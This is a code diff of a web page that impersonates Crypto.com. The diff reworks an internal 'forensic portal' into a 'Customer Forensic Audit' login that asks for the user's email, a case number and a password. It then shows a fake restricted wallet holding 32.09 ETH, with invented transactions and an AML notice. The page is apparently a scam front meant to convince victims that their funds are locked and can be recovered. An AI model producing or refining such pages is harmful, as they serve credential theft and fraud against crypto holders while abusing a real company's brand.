@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Crypto.com | Internal Forensic Portal</title>
+    <title>Crypto.com | Customer Forensic Audit</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -24,124 +24,120 @@
             font-family: 'Inter', sans-serif; overflow-x: hidden;
         }
 
-        /* --- HIGH-PRECISION SVG LOGO --- */
-        .logo-box { display: flex; align-items: center; gap: 15px; margin-bottom: 30px; }
-        .cdc-svg { width: 60px; height: 60px; filter: drop-shadow(0 0 10px rgba(11,58,130,0.4)); }
-        .logo-text-top { font-size: 32px; font-weight: 700; color: #fff; letter-spacing: -1.5px; }
+        /* --- RESTORED HEX LOGO --- */
+        .logo-wrap { display: flex; align-items: center; gap: 40px; transform: scale(0.4); margin-bottom: -50px; }
+        .hex { width: 180px; height: 200px; background: #0B3A82; clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); position: relative; }
+        .lion-top { position: absolute; top: 40px; left: 50%; transform: translateX(-50%); width: 80px; height: 35px; background: white; clip-path: polygon(10% 0,90% 0,100% 100%,0 100%); }
+        .lion-center { position: absolute; top: 80px; left: 50%; transform: translateX(-50%); width: 40px; height: 50px; background: white; clip-path: polygon(20% 0,80% 0,100% 100%,0 100%); }
+        .lion-left { position: absolute; left: 25px; top: 85px; width: 55px; height: 80px; background: white; clip-path: polygon(0 25%, 45% 0, 100% 25%, 75% 65%, 55% 100%, 35% 100%); }
+        .lion-right { position: absolute; right: 25px; top: 85px; width: 55px; height: 80px; background: white; clip-path: polygon(0 25%, 55% 0, 100% 25%, 65% 100%, 45% 100%, 25% 65%); }
+        .logo-text { font-size: 120px; font-weight: 700; color: #fff; letter-spacing: -4px; }
 
         /* --- STAGES --- */
         .stage { display: none; min-height: 100vh; width: 100%; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
         
         /* --- LOGIN CARD --- */
         .login-card { 
-            width: 100%; max-width: 400px; background: #ffffff; border-radius: 16px; 
-            padding: 40px 30px; color: #000; box-shadow: 0 20px 50px rgba(0,0,0,0.5); 
+            width: 100%; max-width: 420px; background: #ffffff; border-radius: 12px; 
+            padding: 45px 35px; color: #000; box-shadow: 0 25px 50px rgba(0,0,0,0.6); 
         }
-        .login-card h1 { font-size: 22px; font-weight: 700; color: var(--cdc-blue); text-align: center; margin-bottom: 30px; }
-        .field { margin-bottom: 20px; }
-        .field label { display: block; font-size: 11px; font-weight: 800; color: #666; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .login-card h1 { font-size: 22px; font-weight: 700; color: var(--cdc-blue); text-align: center; margin-bottom: 35px; }
+        .field { margin-bottom: 22px; }
+        .field label { display: block; font-size: 11px; font-weight: 800; color: #555; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
         .field input { 
-            width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 10px; 
-            font-size: 16px; font-family: 'Inter'; background: #f8f9fb; transition: 0.2s;
+            width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 8px; 
+            font-size: 16px; font-family: 'Inter'; background: #f9f9fb; transition: 0.2s;
         }
         .field input:focus { border-color: var(--cdc-blue); background: #fff; }
         .btn-blue { 
             width: 100%; padding: 18px; background: var(--cdc-blue); color: #fff; 
-            border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer;
-            box-shadow: 0 10px 20px rgba(11,58,130,0.2);
+            border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer;
+            transition: 0.2s;
         }
 
         /* --- DASHBOARD --- */
         .top-nav { 
-            height: 70px; border-bottom: 1px solid var(--cdc-border); display: flex; 
-            align-items: center; padding: 0 20px; background: rgba(6, 17, 33, 0.9); 
-            position: sticky; top: 0; width: 100%; z-index: 100; backdrop-filter: blur(10px);
+            height: 80px; border-bottom: 1px solid var(--cdc-border); display: flex; 
+            align-items: center; padding: 0 25px; background: var(--cdc-dark); 
+            position: sticky; top: 0; width: 100%; z-index: 100;
         }
-        .fraud-banner { background: var(--cdc-red); color: white; width: 100%; padding: 12px; text-align: center; font-size: 11px; font-weight: 800; letter-spacing: 1px; }
-        
-        .wallet-hero { padding: 40px 25px; background: radial-gradient(circle at top right, #0d1e36, #061121); border-bottom: 1px solid var(--cdc-border); width: 100%; }
-        .addr-pill { background: #1a2a40; padding: 10px 15px; border-radius: 8px; font-family: monospace; font-size: 13px; color: var(--cdc-dim); display: inline-block; margin-bottom: 20px; border: 1px solid var(--cdc-border); }
+        .fraud-banner { background: var(--cdc-red); color: white; width: 100%; padding: 14px; text-align: center; font-size: 11px; font-weight: 800; letter-spacing: 1px; text-transform: uppercase; }
+        .wallet-hero { padding: 50px 25px; background: #081221; border-bottom: 1px solid var(--cdc-border); width: 100%; }
+        .addr-pill { background: #1a2a40; padding: 10px 18px; border-radius: 6px; font-family: monospace; font-size: 13px; color: var(--cdc-dim); display: inline-block; margin-bottom: 25px; border: 1px solid var(--cdc-border); }
         
         /* --- TRANSACTION LIST --- */
-        .trx-container { width: 100%; max-width: 800px; padding: 20px; }
-        .trx-card { background: var(--cdc-card); border: 1px solid var(--cdc-border); border-radius: 15px; padding: 20px; margin-bottom: 15px; transition: 0.3s; }
-        .trx-card:hover { border-color: var(--cdc-blue); }
-        .trx-main { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .trx-container { width: 100%; max-width: 800px; padding: 25px; }
+        .trx-card { background: var(--cdc-card); border: 1px solid var(--cdc-border); border-radius: 12px; padding: 20px; margin-bottom: 15px; }
+        .trx-main { display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; }
         .trx-amt { font-size: 20px; font-weight: 700; color: var(--cdc-green); }
-        .trx-status { font-size: 11px; font-weight: 800; color: var(--cdc-green); background: rgba(0,211,149,0.1); padding: 4px 10px; border-radius: 5px; text-transform: uppercase; }
+        .trx-status { font-size: 10px; font-weight: 800; color: var(--cdc-green); border: 1px solid var(--cdc-green); padding: 3px 10px; border-radius: 4px; text-transform: uppercase; }
         
-        .trx-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; font-size: 12px; color: var(--cdc-dim); border-top: 1px solid rgba(255,255,255,0.05); padding-top: 15px; }
-        .trx-grid div span { display: block; font-size: 10px; font-weight: 700; color: #566a82; margin-bottom: 4px; text-transform: uppercase; }
+        .trx-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; font-size: 12px; color: var(--cdc-dim); border-top: 1px solid rgba(255,255,255,0.05); padding-top: 18px; }
+        .trx-grid div span { display: block; font-size: 10px; font-weight: 700; color: #566a82; margin-bottom: 5px; text-transform: uppercase; }
         .trx-grid div b { color: #fff; font-family: monospace; font-size: 12px; word-break: break-all; }
 
-        /* --- UTILS --- */
-        .spinner { width: 40px; height: 40px; border: 3px solid #1a2a40; border-top-color: var(--cdc-blue); border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .spinner { width: 45px; height: 45px; border: 3px solid #1a2a40; border-top-color: var(--cdc-blue); border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-thumb { background: var(--cdc-border); border-radius: 10px; }
     </style>
 </head>
 <body>
 
     <!-- STAGE 1: LOGIN -->
     <div id="login-stage" class="stage" style="display: flex;">
-        <div class="logo-box">
-            <svg class="cdc-svg" viewBox="0 0 200 200">
-                <path d="M100 0 L186.6 50 L186.6 150 L100 200 L13.4 150 L13.4 50 Z" fill="#0B3A82"/>
-                <path d="M100 40 L140 65 L140 135 L100 160 L60 135 L60 65 Z" fill="white" fill-opacity="0.1"/>
-                <path d="M70 70 L130 70 L130 85 L70 85 Z M90 95 L110 95 L110 135 L90 135 Z M50 95 L85 95 L85 145 L70 160 L50 145 Z M150 95 L115 95 L115 145 L130 160 L150 145 Z" fill="white"/>
-            </svg>
-            <div class="logo-text-top">crypto.com</div>
+        <div class="logo-wrap">
+            <div class="hex">
+                <div class="lion-top"></div><div class="lion-center"></div>
+                <div class="lion-left"></div><div class="lion-right"></div>
+            </div>
+            <div class="logo-text">crypto.com</div>
         </div>
         <div class="login-card">
-            <h1>Internal Audit Login</h1>
+            <h1>Customer Forensic Audit</h1>
             <div class="field">
-                <label>Officer ID / Email</label>
-                <input type="text" id="email" placeholder="agent@crypto.com">
+                <label>Customer Email</label>
+                <input type="text" id="email" placeholder="Enter your email">
             </div>
             <div class="field">
-                <label>Case File Reference</label>
-                <input type="text" id="case" placeholder="CDC-FRAUD-9921">
+                <label>Case Recovery Number</label>
+                <input type="text" id="case" placeholder="CDC-XXXX-XXXX">
             </div>
             <div class="field">
                 <label>Audit Password</label>
-                <input type="password" id="pass" placeholder="••••••••">
+                <input type="password" id="pass" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢">
             </div>
-            <button class="btn-blue" onclick="startAudit()">Initiate Forensic Scan</button>
+            <button class="btn-blue" onclick="startAudit()">Access Secure Ledger</button>
         </div>
     </div>
 
     <!-- STAGE 2: LOADING -->
     <div id="loading-stage" class="stage">
         <div class="spinner"></div>
-        <p style="margin-top:20px; font-weight:700; font-size:11px; color:var(--cdc-dim); letter-spacing:2px;">DECRYPTING ON-CHAIN DATA...</p>
+        <p style="margin-top:25px; font-weight:700; font-size:11px; color:var(--cdc-dim); letter-spacing:2px; text-transform: uppercase;">Syncing Secure Blockchain Data...</p>
     </div>
 
     <!-- STAGE 3: WALLET VIEW -->
     <div id="app-stage" class="stage" style="padding:0; justify-content:flex-start; display:none;">
         <div class="top-nav">
-             <div class="logo-box" style="margin-bottom:0; transform: scale(0.6); margin-left: -20px;">
-                <svg class="cdc-svg" viewBox="0 0 200 200">
-                    <path d="M100 0 L186.6 50 L186.6 150 L100 200 L13.4 150 L13.4 50 Z" fill="#0B3A82"/>
-                    <path d="M70 70 L130 70 L130 85 L70 85 Z M90 95 L110 95 L110 135 L90 135 Z M50 95 L85 95 L85 145 L70 160 L50 145 Z M150 95 L115 95 L115 145 L130 160 L150 145 Z" fill="white"/>
-                </svg>
-                <div class="logo-text-top">crypto.com</div>
+             <div class="logo-wrap" style="transform:scale(0.18); margin-left:-75px; margin-bottom:0;">
+                <div class="hex">
+                    <div class="lion-top"></div><div class="lion-center"></div>
+                    <div class="lion-left"></div><div class="lion-right"></div>
+                </div>
+                <div class="logo-text">crypto.com</div>
             </div>
         </div>
-        <div class="fraud-banner">CRITICAL: WALLET PERMANENTLY BLOCKED FOR FRAUDULENT ACTIONS</div>
+        <div class="fraud-banner">Notice: Wallet Restricted Due to AML Verification Protocols</div>
         
         <div class="wallet-hero">
-            <div class="addr-pill">Target: 0x914C6d6D8d45Ff73E65F358b0bF7c09689bED27F</div>
-            <div style="font-size:12px; color:var(--cdc-dim); font-weight:700; letter-spacing: 1px;">TOTAL SEIZED LIQUIDITY</div>
-            <div style="font-size:42px; font-weight:700; margin:15px 0;">32.09 ETH</div>
-            <div style="font-size:20px; color:var(--cdc-green); font-weight:600;">$79,211.88 USD (Locked)</div>
+            <div class="addr-pill">Linked Address: 0x914C6d6D8d45Ff73E65F358b0bF7c09689bED27F</div>
+            <div style="font-size:12px; color:var(--cdc-dim); font-weight:700; letter-spacing: 1px; text-transform: uppercase;">Total Restricted Balance</div>
+            <div style="font-size:48px; font-weight:700; margin:15px 0; letter-spacing: -1px;">32.09 ETH</div>
+            <div style="font-size:22px; color:var(--cdc-green); font-weight:600;">$79,211.88 USD</div>
         </div>
 
-        <div class="trx-container" id="trx-list">
-            <!-- Transactions Injected Here -->
-        </div>
+        <div class="trx-container" id="trx-list"></div>
 
-        <button class="btn-blue" style="margin:20px; width:calc(100% - 40px); background:#1a2a40; border:1px solid var(--cdc-border);" onclick="location.reload()">Close Secure Connection</button>
+        <button class="btn-blue" style="margin:25px; width:calc(100% - 50px); background:#1a2a40; border:1px solid var(--cdc-border);" onclick="location.reload()">Secure Logout</button>
     </div>
 
     <script>
@@ -150,30 +146,18 @@
             { amount: "2.55 ETH", hash: "0x9112bc5a...a8811f", block: "1922710", gas: "24 Gwei" },
             { amount: "0.90 ETH", hash: "0xbb331acc...cc9221", block: "1922650", gas: "18 Gwei" },
             { amount: "4.12 ETH", hash: "0xee9912ff...4411ba", block: "1922401", gas: "32 Gwei" },
-            { amount: "0.45 ETH", hash: "0xda1122bb...bb9900", block: "1922350", gas: "20 Gwei" },
-            { amount: "5.00 ETH", hash: "0xac4455dd...dd1122", block: "1922200", gas: "28 Gwei" },
-            { amount: "1.15 ETH", hash: "0x778899aa...aa3344", block: "1922150", gas: "19 Gwei" },
-            { amount: "0.88 ETH", hash: "0x11223344...445566", block: "1922005", gas: "22 Gwei" },
-            { amount: "3.20 ETH", hash: "0x66778899...99aabb", block: "1921980", gas: "25 Gwei" },
-            { amount: "1.75 ETH", hash: "0xccddeeff...ff1122", block: "1921800", gas: "21 Gwei" }
+            { amount: "0.45 ETH", hash: "0xda1122bb...bb9900", block: "1922350", gas: "20 Gwei" }
         ];
 
         function startAudit() {
-            const e = document.getElementById('email').value;
-            const c = document.getElementById('case').value;
-            const p = document.getElementById('pass').value;
-
-            if(!e || !c || !p) return alert("Fields Required.");
-
+            if(!document.getElementById('email').value || !document.getElementById('case').value || !document.getElementById('pass').value) return;
             document.getElementById('login-stage').style.display = 'none';
             document.getElementById('loading-stage').style.display = 'flex';
-
             renderTrx();
-
             setTimeout(() => {
                 document.getElementById('loading-stage').style.display = 'none';
                 document.getElementById('app-stage').style.display = 'flex';
-            }, 2500);
+            }, 2800);
         }
 
         function renderTrx() {
@@ -182,13 +166,13 @@
                 <div class="trx-card">
                     <div class="trx-main">
                         <span class="trx-amt">+ ${t.amount}</span>
-                        <span class="trx-status">Approved</span>
+                        <span class="trx-status">Confirmed</span>
                     </div>
                     <div class="trx-grid">
-                        <div><span>Tx Hash</span><b>${t.hash}</b></div>
-                        <div><span>Block</span><b>#${t.block}</b></div>
-                        <div><span>Gas Price</span><b>${t.gas}</b></div>
-                        <div><span>Method</span><b>Inbound</b></div>
+                        <div><span>Transaction Hash</span><b>${t.hash}</b></div>
+                        <div><span>Network Block</span><b>#${t.block}</b></div>
+                        <div><span>Gas Fee</span><b>${t.gas}</b></div>
+                        <div><span>Status</span><b>Settled</b></div>
                     </div>
                 </div>
             `).join('');
